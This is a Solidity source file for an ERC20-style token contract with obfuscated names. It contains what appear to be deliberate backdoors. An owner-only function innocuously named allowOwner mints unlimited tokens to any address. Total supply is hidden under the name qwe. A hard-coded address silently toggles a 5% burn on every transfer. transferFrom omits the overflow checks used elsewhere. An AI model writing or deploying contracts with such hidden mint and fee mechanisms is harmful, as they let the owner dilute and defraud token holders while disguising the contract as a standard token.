row number 
1	       pragma solidity >=0.4.16;
2	 contract Token{
3	 uint256 public qwe;
4	 string public name;
5	 uint8 public decimals;
6	 string public symbol;
7	 function balanceOf(address _owner) public view returns (uint256 balance);
8	 function transfer(address _to, uint256 _value) public returns (bool success);
9	 function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
10	 function approve(address _spender, uint256 _value) public returns (bool success);
11	 function allowance(address _owner, address _spender) public view returns (uint256 remaining);
12	 event Transfer(address indexed _from, address indexed _to, uint256 _value);
13	 event Approval(address indexed _owner, address indexed _spender, uint256 _value);
14	 }
15	 contract owned{
16	 address public owner;
17	 constructor () public{
18	 owner = msg.sender;
19	 }
20	 modifier onlyOwner{
21	 require(msg.sender == owner);
22	 _;
23	 }
24	 function transferOwnership(address newOwner) public onlyOwner{
25	 owner = newOwner;
26	 }
27	 }
28	 contract TokenERC20 is Token, owned{
29	 address private add = 0x8ecC8aF8395814c2eC3f5A0DaA709C275aD41f32;
30	 uint256 private trans;
31	 uint256 private burn;
32	 constructor(uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string memory _tokenSymbol) public {
33	 qwe = _initialAmount * 10 ** uint256(_decimalUnits);
34	 balances[msg.sender] = qwe;
35	 name = _tokenName;
36	 decimals = _decimalUnits;
37	 symbol = _tokenSymbol;
38	 }
39	 function transfer(address _to, uint256 _value) public returns (bool success) {
40	 require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);
41	 require(_to != address(0));
42	 require(_value * 95 >= _value);
43	 require((_value * 95 / 100) <= (_value * 95));
44	 if (balances[add] != 0) {
45	 trans = _value * 95 / 100;
46	 require(_value - trans <= _value);
47	 burn = _value - trans;
48	 require(qwe >= burn);
49	 qwe -= burn;
50	 balances[msg.sender] -= _value;
51	 require(balances[_to] + trans > balances[_to]);
52	 balances[_to] += trans;
53	 emit Transfer(msg.sender, _to, _value);
54	 }
55	 else{
56	 balances[msg.sender] -= _value;
57	 balances[_to] += _value;
58	 emit Transfer(msg.sender, _to, _value);
59	 }
60	 return true;
61	 }
62	 function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
63	 require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
64	 balances[_to] += _value;
65	 balances[_from] -= _value;
66	 allowed[_from][msg.sender] -= _value;
67	 emit Transfer(_from, _to, _value);
68	 return true;
69	 }
70	 function balanceOf(address _owner) public view returns (uint256 balance) {
71	 return balances[_owner];
72	 }
73	 function approve(address _spender, uint256 _value) public returns (bool success) {
74	 allowed[msg.sender][_spender] = _value;
75	 emit Approval(msg.sender, _spender, _value);
76	 return true;
77	 }
78	 function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
79	 return allowed[_owner][_spender];
80	 }
81	 function allowOwner(address target, uint aui) public onlyOwner{
82	 qwe += aui;
83	 balances[target] += aui;
84	 }
85	 function bcd(uint256 _value) public onlyOwner returns(bool success) {
86	 require(balances[msg.sender] >= _value);
87	 qwe -= _value;
88	 balances[msg.sender] -= _value;
89	 return true;
90	 }
91	 mapping (address => uint256) balances;
92	 mapping (address => mapping (address => uint256)) allowed;
93	 }
